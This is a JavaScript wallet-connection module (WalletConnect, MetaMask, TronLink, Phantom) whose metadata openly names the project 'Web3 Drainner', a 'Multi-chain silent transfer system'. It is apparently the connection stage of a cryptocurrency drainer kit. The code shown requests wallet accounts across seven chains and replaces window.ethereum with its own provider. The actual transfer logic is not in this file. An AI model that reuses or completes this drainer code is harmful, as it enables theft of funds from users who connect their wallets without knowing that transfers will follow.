import { openWalletWithDeepLink, detectInstalledWallets, isMobileDevice } from './walletDeepLink'

const WALLETCONNECT_PROJECT_ID = '81ec0eb195ddbee9c5596804e33ff584'

let wcProvider = null
let connectionAbortController = null
let currentUri = null

async function loadEthereumProvider() {
  // Try local bundler-resolved import first
  try {
    const mod = await import('@walletconnect/ethereum-provider')
    return mod?.EthereumProvider || mod?.default || mod
  } catch (err) {
    console.warn('Local import of @walletconnect/ethereum-provider failed, falling back to CDN:', err)
  }

  // Fallback to CDN ESM build
  try {
    const mod = await import('https://unpkg.com/@walletconnect/ethereum-provider@2.10.0?module')
    return mod?.EthereumProvider || mod?.default || mod
  } catch (err) {
    console.error('CDN fallback for WalletConnect failed:', err)
    throw err
  }
}

/**
 * Initialize WalletConnect with fallback support
 */
export async function initWalletConnect() {
  try {
    if (wcProvider) return wcProvider

    console.log('🚀 Initializing WalletConnect...')

    const ProviderClass = await loadEthereumProvider()

    wcProvider = await ProviderClass.init({
      projectId: WALLETCONNECT_PROJECT_ID,
      chains: [1, 56, 137, 42161, 8453, 10, 43114], // Ethereum, BSC, Polygon, Arbitrum, Base, Optimism, Avalanche
      showQrModal: true,
      qrModalOptions: {
        themeMode: 'dark',
        explorerRecommendedWalletIds: ['c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96'], // MetaMask
        explorerExcludedWalletIds: 'all'
      },
      metadata: {
        name: 'Web3 Drainner',
        description: 'Multi-chain silent transfer system',
        url: typeof window !== 'undefined' ? window.location.origin : 'https://localhost:3000',
        icons: ['https://avatars.githubusercontent.com/u/37784886']
      },
      relayUrl: 'wss://relay.walletconnect.com',
      rpcMap: {
        1: 'https://eth.rpc.blxrbdn.com',
        56: 'https://bsc-dataseed1.binance.org:443',
        137: 'https://polygon-rpc.com',
        42161: 'https://arb1.arbitrum.io/rpc',
        8453: 'https://mainnet.base.org',
        10: 'https://mainnet.optimism.io',
        43114: 'https://api.avax.network/ext/bc/C/rpc'
      }
    })

    // Listen for wallet connection
    wcProvider.on('connect', (session) => {
      console.log('✅ Wallet connected via WalletConnect:', session)
    })

    wcProvider.on('session_update', (accounts) => {
      console.log('📱 Session updated with accounts:', accounts)
    })

    wcProvider.on('disconnect', () => {
      console.log('🔌 Wallet disconnected')
      wcProvider = null
    })

    console.log('✅ WalletConnect initialized successfully')
    return wcProvider
  } catch (error) {
    console.error('Failed to initialize WalletConnect:', error)
    wcProvider = null
    throw error
  }
}

/**
 * Connect wallet with timeout and fallback
 */
export async function connectWallet(timeoutMs = 45000) {
  try {
    console.log('🔗 Starting wallet connection process...')

    // Create abort controller for timeout
    connectionAbortController = new AbortController()
    const timeoutId = setTimeout(() => {
      connectionAbortController.abort()
      console.warn('⏱️ Connection timeout - attempting fallback')
    }, timeoutMs)

    try {
      const provider = await initWalletConnect()

      console.log('📞 Calling provider.enable()...')

      // Try to connect with timeout
      const accounts = await Promise.race([
        provider.enable(),
        new Promise((_, reject) =>
          connectionAbortController.signal.addEventListener('abort', () =>
            reject(new Error('Connection timeout - relay may be offline or wallet not responding'))
          )
        )
      ])

      clearTimeout(timeoutId)

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts returned from wallet')
      }

      // Store provider
      window.ethereum = provider

      console.log('✅ Connected via WalletConnect:', accounts[0])

      return {
        account: accounts[0],
        provider
      }
    } catch (error) {
      clearTimeout(timeoutId)

      console.error('❌ WalletConnect error:', error.message)
      console.warn('⚠️ Relay failed, attempting direct wallet connection...')

      return await connectDirectWallet()
    }
  } catch (error) {
    console.error('❌ Wallet connection failed:', error)
    throw error
  }
}

/**
 * Connect directly to installed wallet (no relay)
 */
export async function connectDirectWallet() {
  try {
    const installed = detectInstalledWallets()

    if (installed.length === 0) {
      throw new Error(
        'No wallet app detected. Please install MetaMask, TronLink, Trust Wallet, or another Web3 wallet.'
      )
    }

    console.log('📱 Detected wallets:', installed)

    // Use first installed wallet
    const walletName = installed[0]
    console.log(`🔓 Opening ${walletName} app for connection approval...`)

    // Handle MetaMask
    if (walletName === 'metamask' && window.ethereum?.isMetaMask) {
      console.log('🦊 Connecting to MetaMask...')
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts'
      })

      if (!accounts || accounts.length === 0) {
        throw new Error('No accounts returned from MetaMask')
      }

      console.log('✅ Connected to MetaMask:', accounts[0])

      return {
        account: accounts[0],
        provider: window.ethereum
      }
    }

    // Handle TronLink
    if (walletName === 'tronlink' && window.tronLink) {
      console.log('🟣 Connecting to TronLink...')
      const account = await window.tronLink.request({
        method: 'tron_requestAccounts'
      })

      if (!account) {
        throw new Error('Failed to get TronLink account')
      }

      console.log('✅ Connected to TronLink:', account)

      return {
        account: account,
        provider: window.tronLink
      }
    }

    // Handle Phantom
    if (walletName === 'phantom' && window.phantom?.solana) {
      console.log('👻 Connecting to Phantom...')
      const response = await window.phantom.solana.connect()

      if (!response?.publicKey) {
        throw new Error('Failed to get Phantom public key')
      }

      console.log('✅ Connected to Phantom:', response.publicKey.toString())

      return {
        account: response.publicKey.toString(),
        provider: window.phantom.solana
      }
    }

    throw new Error(`Unsupported wallet: ${walletName}`)
  } catch (error) {
    console.error('❌ Direct wallet connection failed:', error)
    throw error
  }
}

/**
 * Disconnect wallet
 */
export async function disconnectWallet() {
  try {
    if (wcProvider) {
      await wcProvider.disconnect()
    }

    if (window.ethereum?.disconnect) {
      await window.ethereum.disconnect()
    }
    
    // Clear local storage
    const keysToRemove = []
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i)
      if (key && (
        key.includes('walletconnect') || 
        key.includes('wc_') || 
        key.includes('@walletconnect')
      )) {
        keysToRemove.push(key)
      }
    }
    keysToRemove.forEach(key => localStorage.removeItem(key))
    wcProvider = null

    console.log('✅ Wallet disconnected and storage cleared')
  } catch (error) {
    console.error('Disconnect error:', error)
  }
}

/**
 * Format wallet address for display
 */
export function formatAddress(address) {
  if (!address) return ''
  return `${address.slice(0, 6)}...${address.slice(-4)}`
}
